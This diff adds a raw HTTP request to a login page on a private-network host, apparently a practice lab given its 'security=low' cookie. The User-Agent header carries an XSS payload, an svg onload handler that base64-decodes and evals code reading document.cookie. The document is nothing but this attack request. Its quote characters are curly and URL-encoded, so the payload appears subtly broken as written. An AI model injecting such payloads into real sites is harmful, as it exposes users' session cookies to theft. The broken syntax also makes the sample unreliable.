@@ -1,0 +1,8 @@
+GET /login.php HTTP/1.1
+Host: 10.20.186.207:1111
+User-Agent: <svg/onload=eval(atob(%E2%80%98YWxlcnQoZG9jdW1lbnQuY29va2llKQ==%E2%80%99))>
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: close
+Cookie: PHPSESSID=78fp0a6suntjihrnffb3qa2sg0; security=low
+
